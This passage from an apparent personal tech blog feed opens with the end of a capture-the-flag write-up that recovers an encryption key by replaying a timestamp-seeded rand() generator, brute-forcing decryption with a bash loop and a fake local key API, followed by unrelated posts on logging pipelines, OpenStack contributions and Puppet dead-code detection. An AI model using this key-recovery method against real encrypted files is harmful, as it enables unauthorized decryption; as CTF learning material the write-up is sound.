    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
      &lt;span class="k"&gt;nonlocal&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt;
      &lt;span class="n"&gt;fixed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt;
      &lt;span class="n"&gt;keyarray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytearray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#ka = (214013*seed + 2531011)&lt;/span&gt;
        &lt;span class="n"&gt;fixed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fixed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mh"&gt;0x343fd&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x269ec3&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fixed&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x7ffffff&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt; &lt;span class="c1"&gt;# &amp;gt;&amp;gt; sar 16 &amp;amp; is and. We only want the last two bytes - the start look very similar..&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;x&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# because movzx&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;keyarray&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyarray&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# last two&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

&lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1575658800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1575666001&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# so not off by 1                ^&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;rseed&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;two&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;msvcrt_rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rseed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;two&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Trying the edit hosts file. As I use WSL I learnt that for .exe files I also need to update window's hosts file, even though I run it from inside the WSL! Also the syntax is &lt;strong&gt;NOT&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;localhost elfscrow.elfu.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Bunch of false positives for some reason... when I use the list of keys I generated and my API and a localhost flask API and hosts file override. Anyway, let this run and used file to stop when it found a pdf, it stopped at 4849 (or 4850th key in keys [] in my python api.py, unsure if that is sorted.. so the creation time might have been 1575663650 ( &lt;em&gt;Friday, December 6, 2019 8:20:50 PM&lt;/em&gt; ) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="c1"&gt;# the Bruter&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;i&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;seq&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;7200&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;./elfscrow.exe&lt;span class="w"&gt; &lt;/span&gt;--decrypt&lt;span class="w"&gt; &lt;/span&gt;--id&lt;span class="o"&gt;=&lt;/span&gt;7debfae7-3a16-41e7-b211-678f5ebdce00&lt;span class="w"&gt; &lt;/span&gt;ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc&lt;span class="w"&gt; &lt;/span&gt;out.pdf&lt;span class="w"&gt; &lt;/span&gt;--insecure
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-f&lt;span class="w"&gt; &lt;/span&gt;out.pdf&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;
&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="nv"&gt;isitpdf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;file&lt;span class="w"&gt; &lt;/span&gt;out.pdf&lt;span class="p"&gt;|&lt;/span&gt;grep&lt;span class="w"&gt; &lt;/span&gt;-c&lt;span class="w"&gt; &lt;/span&gt;PDF&lt;span class="k"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$isitpdf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$isitpdf&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GOT IT &lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;123&lt;/span&gt;
&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;out.pdf&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;falses/&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;.pdf&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and the API.py&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#https://stoplight.io/python-rest-api/&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;keys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;b5ad6a321240fbec&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;7200...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;7199&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/api/retrieve&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;methods&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_companies&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="c1"&gt;# store last key tested in a file&lt;/span&gt;

  &lt;span class="n"&gt;statefile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/root/elfscrow_status&amp;quot;&lt;/span&gt;
  &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statefile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statefile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;icontent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;ncontent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Last was &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;, updating to &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;icontent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ncontent&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statefile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ncontent&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ncontent&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="c1"&gt;#return json.dumps(companies)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then to get the key was just a pdf2txt and the 5 word sentence in the beginning of the document!&lt;/p&gt;
&lt;h2 id="ok-the-zeekbro-logs-is-the-last-one"&gt;OK THE ZEEK/BRO Logs is the last one?&lt;/h2&gt;
&lt;p&gt;The username was found in https://srf.elfu.org/README.md&lt;/p&gt;
&lt;p&gt;Started on this earlier but stopped because I wasn't feeling it and it was a bit tedious.&lt;br&gt;
Plan: Make the queries programmatically. Also this time check sizes of requests maybe that's important. Also time when attacks happen could be useful?&lt;/p&gt;
&lt;p&gt;let's try out &lt;a href="https://github.com/activecm/rita"&gt;RITA&lt;/a&gt; as indicated in a hint, also found &lt;a href="https://github.com/idaholab/Malcolm"&gt;Malcolm&lt;/a&gt; while looking up this tool.. could be fun. But at least RITA couldn't import the http.log :/&lt;/p&gt;
&lt;p&gt;weird that the IPs in with the LFI, shellshock etc haven't posted.. maybe they posted later?&lt;/p&gt;
&lt;p&gt;Wow you made it all this way? Prepare for a bit of downer! :)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;In the end I ran out of time. End of new year approached and some busy times in January 2020! Turned out I got quite far with a python script, but had too many good IPs in my list I think. In the end I used a JQ solution found in a writeup that is available in the google cache, initially found by searching for the numbers used for the srand function in the elfscrow challenge.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://downloads.elfu.org/LetterOfWintryMagic.pdf"&gt;https://downloads.elfu.org/LetterOfWintryMagic.pdf&lt;/a&gt;&lt;/p&gt;</content><category term="it"></category><category term="ctf"></category><category term="pdftotext"></category><category term="python"></category><category term="programming"></category><category term="language"></category><category term="security"></category><category term="sudo"></category><category term="trail"></category><category term="of"></category><category term="tears"></category></entry><entry><title>Logging as a Service</title><link href="/logging-as-a-service.html" rel="alternate"></link><published>2019-11-12T00:00:00+02:00</published><updated>2019-11-12T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-11-12:/logging-as-a-service.html</id><summary type="html">&lt;p&gt;Is there an open source thing out there I could use??&lt;/p&gt;
&lt;p&gt;So if I only want to use mostly free and open source it there's a bunch of tools one need to glue together:&lt;/p&gt;
&lt;p&gt;These days I'd like to for primary ingestion have a BGP ECMP/anycast for rsyslog receivers …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Is there an open source thing out there I could use??&lt;/p&gt;
&lt;p&gt;So if I only want to use mostly free and open source it there's a bunch of tools one need to glue together:&lt;/p&gt;
&lt;p&gt;These days I'd like to for primary ingestion have a BGP ECMP/anycast for rsyslog receivers. These also run logstash (or beat?). Or maybe one can have a load balancer up front which redirects traffic based on incoming port (and maybe a syslog tag for some 'authentication' ? ) to a set of logparsing/rsyslog servers.&lt;/p&gt;
&lt;p&gt;These would write to a Kafka cluster.&lt;/p&gt;
&lt;p&gt;Then we would need more readers to stream events on to elastic, siems or Hadoop or for example longer term storage engines.&lt;/p&gt;
&lt;p&gt;For the as a Service bit I'd like to play with Rundeck and have users configure most of the bits themselves. Logstash grokking/parsing though needs outsourcing too. Fewer rules means more throughput so would be good with different logstash processes for different logs. Could like loggly direct users to ship logs with a tag to get them into the correct lane.&lt;/p&gt;
&lt;p&gt;For reading just grafana and kibana should be a good start.&lt;/p&gt;</content><category term="it"></category></entry><entry><title>Contributing To OpenStack Upstream</title><link href="/contributing-to-openstack-upstream.html" rel="alternate"></link><published>2019-07-22T00:00:00+03:00</published><updated>2019-07-22T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-07-22:/contributing-to-openstack-upstream.html</id><summary type="html">&lt;p&gt;Recently I had the pleasure of &lt;strong&gt;contributing&lt;/strong&gt; upstream to the &lt;a href="https://www.openstack.org/"&gt;OpenStack&lt;/a&gt; project!&lt;/p&gt;
&lt;p&gt;A link to my merged patches: &lt;a href="https://review.opendev.org/#/q/owner:+guldmyr+status:merged"&gt;https://review.opendev.org/#/q/owner:+guldmyr+status:merged&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In a previous &lt;a href="https://www.openstack.org/"&gt;OpenStack&lt;/a&gt; summit (these days called OpenInfra Summits), (Vancouver 2018) I went there a few days early and attended the &lt;strong&gt;Upstream …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Recently I had the pleasure of &lt;strong&gt;contributing&lt;/strong&gt; upstream to the &lt;a href="https://www.openstack.org/"&gt;OpenStack&lt;/a&gt; project!&lt;/p&gt;
&lt;p&gt;A link to my merged patches: &lt;a href="https://review.opendev.org/#/q/owner:+guldmyr+status:merged"&gt;https://review.opendev.org/#/q/owner:+guldmyr+status:merged&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In a previous &lt;a href="https://www.openstack.org/"&gt;OpenStack&lt;/a&gt; summit (these days called OpenInfra Summits), (Vancouver 2018) I went there a few days early and attended the &lt;strong&gt;Upstream Institute&lt;/strong&gt; &lt;a href="https://docs.openstack.org/upstream-training/"&gt;https://docs.openstack.org/upstream-training/&lt;/a&gt; .&lt;br&gt;
It was 1.5 days long or so if I remember right. Looking up my notes from that these were the highlights:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Best way to start getting involved is to attend weekly meetings of projects&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stickersssss&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;A very similar process to RDO with Gerrit and reviews&lt;/li&gt;
&lt;li&gt;Underlying tests are all done with ansible and they have ARA enabled so one gets a nice Web UI to view results afterward. Logs are saved as part of the &lt;a href="http://zuul.openstack.org"&gt;Zuul testing&lt;/a&gt; too so one can really dig into and see what is tested and if something breaks when it's being tested.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Even though my patches were one baby and a bit over 1 year in time after the Upstream Institute I could still f&lt;a href="https://docs.openstack.org/contributors/"&gt;igure things out&lt;/a&gt; quite quickly with the help of the guides and get bugs created and patches submitted. My general plan when first attending it wasn't to contribute code changes, but rather to start reading code, perhaps find open bugs and so on.&lt;/p&gt;
&lt;p&gt;The thing I wanted to change in puppet-keystone was apparently also possible to change in many other puppet-* modules, and less than a day after my puppet-keystone change got merged into master someone else &lt;strong&gt;picked up the torch&lt;/strong&gt; and made PRs to like ~15 other repositories with similar changes :) Pretty cool!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Testing&lt;/strong&gt; is hard! &lt;a href="https://review.opendev.org/#/c/669045/1"&gt;https://review.opendev.org/#/c/669045/1&lt;/a&gt; is one backport I created for puppet-keystone/rocky, and the Ubuntu testing was not working initially (started with an APT mirror issue and later it was slow and timed out)... After 20 rechecks and two weeks, it still hadn't successfully passed a test. In the end we got there though with the help of a core reviewer that actually updated some mirror and later disabled some tests :)&lt;/p&gt;
&lt;p&gt;Now &lt;strong&gt;the change itself&lt;/strong&gt; was about "oslo_middleware/max_request_body_size" So that we can increase it from the default 114688. The Pouta Cloud had issues where our &lt;a href="https://docs.openstack.org/keystone/pike/advanced-topics/federation/configure_federation.html#mapping"&gt;Federation User Mappings&lt;/a&gt; were larger than 114688 bytes and we coudln't update them anymore, turns out they were blocked by oslo_middleware.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(&lt;strong&gt;does anybody know where 114688bytes comes&lt;/strong&gt; &lt;strong&gt;from&lt;/strong&gt;? Some internal speculation has been that it is from 128kilobytes minus some headers)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Anyway, the mapping we have now is simplified just a long [ list ] of "local_username": "federation_email", domain: "default". I think next step might be to try to figure out if maybe we can make the rules using something like below instead of hardcoding the values into the rules  &lt;/p&gt;
&lt;p&gt;"name": "{0}" &lt;/p&gt;
&lt;p&gt;It's been quite hard to find examples that are exactly like our use-case (and playing about with is not a priority right now, just something in the backlog, but could be interesting to look at when we start accepting more federations).&lt;/p&gt;
&lt;p&gt;All in all, I'm really happy to have gotten to contribute something to the OpenStack ecosystem!&lt;/p&gt;</content><category term="it"></category><category term="backporting"></category><category term="gerrit"></category><category term="git"></category><category term="keystone"></category><category term="openstack"></category><category term="puppet"></category><category term="rdo"></category><category term="vancouver"></category></entry><entry><title>Taking puppet-ghostbuster for a spin</title><link href="/taking-puppet-ghostbuster-for-a-spin.html" rel="alternate"></link><published>2019-07-18T00:00:00+03:00</published><updated>2019-07-18T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-07-18:/taking-puppet-ghostbuster-for-a-spin.html</id><summary type="html">&lt;p&gt;We use puppet at $dayjob to configure OpenStack.&lt;/p&gt;
&lt;p&gt;I wanted to know if there's a lot of unused code in our manifests!&lt;/p&gt;
&lt;p&gt;**From left of stage enters: https://github.com/camptocamp/puppet-ghostbuster **&lt;/p&gt;
&lt;p&gt;Step one is to install the puppet modules and gems and whatnot, this blog post was good about …&lt;/p&gt;</summary><content type="html">&lt;p&gt;We use puppet at $dayjob to configure OpenStack.&lt;/p&gt;
&lt;p&gt;I wanted to know if there's a lot of unused code in our manifests!&lt;/p&gt;
&lt;p&gt;**From left of stage enters: https://github.com/camptocamp/puppet-ghostbuster **&lt;/p&gt;
&lt;p&gt;Step one is to install the puppet modules and gems and whatnot, this blog post was good about that: &lt;a href="https://codingbee.net/puppet/puppet-identifying-dead-puppet-code-using-puppet-ghostbuster"&gt;https://codingbee.net/puppet/puppet-identifying-dead-puppet-code-using-puppet-ghostbuster&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Next I needed to get the HTTP forwarding of the puppetdb working, this can apparently (I learnt about ssh -J) be done with:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ssh -J jumphost.example.org INTERNALIPOFPUPPETMASTER -L 8081:localhost:8080&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then for setting some variables pointing to hiera.yaml and setting&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PUPPETDB_URL=http://localhost:8081 HIERA_YAML=/tmp/hiera.yaml&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Unsure if hiera.yaml works, just copied it in from the puppetmaster&lt;/p&gt;
&lt;p&gt;Then running it&lt;/p&gt;
&lt;blockquote&gt;
